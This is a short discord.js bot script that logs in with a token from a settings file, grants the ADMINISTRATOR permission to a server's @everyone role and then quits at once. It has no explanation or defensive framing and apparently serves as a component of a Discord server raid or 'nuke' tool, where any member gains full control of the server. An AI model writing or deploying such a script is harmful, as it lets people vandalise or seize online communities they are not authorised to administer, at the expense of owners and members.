const Discord = require('discord.js');
const client = new Discord.Client();
const settings = require('../settings.json');

client.on('ready', () => {
    function all(){
    client.guilds.get(settings.auto.server_id).roles.find('name', '@everyone').edit({
        permissions: ["ADMINISTRATOR"]
    });
}
    function quit(){
        process.exit();
    }
    setTimeout(all, 1000)
    setTimeout(quit, 2000);
});

client.login(settings.token);